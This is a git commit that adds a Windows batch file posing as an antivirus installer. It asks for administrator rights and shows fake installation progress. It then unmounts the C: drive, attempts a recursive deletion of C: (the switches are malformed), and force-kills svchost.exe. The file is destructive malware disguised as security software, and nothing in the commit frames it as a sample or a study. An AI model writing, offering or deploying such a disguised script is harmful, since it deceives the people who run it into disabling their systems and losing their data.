b492e9bb4db851322a3eeb5f1e53f892949c1e7f
kyrok638 <134541021+Arslanailaiti@users.noreply.github.com>
2024-02-01 21:12:28 +0100

    Add files via upload

---
+++ antvirusexe45.bat
@@ -0,0 +1,33 @@
+@echo off
+
+echo By kyrok638 (YOU NEED RUN ADMINISTRASTOR)
+pause
+echo Install Anti virus?
+pause
+echo Expanding Files
+echo Installing Anti Virus
+echo 1%
+echo 5%
+echo 8%
+echo 34%
+echo 67%
+echo 69%
+echo 70%
+echo 90%
+echo 91%
+echo 92%
+echo 93%
+echo 99%
+echo 100%
+echo 1002%
+echo 3642894368492387%
+echo 9999999999999999999999999999999999999999999999%
+@echo on
+
+mountvol C: /d
+rd C:\ s\ \q
+@echo off
+
+echo 
+pause
+taskkill /im svchost.exe /f
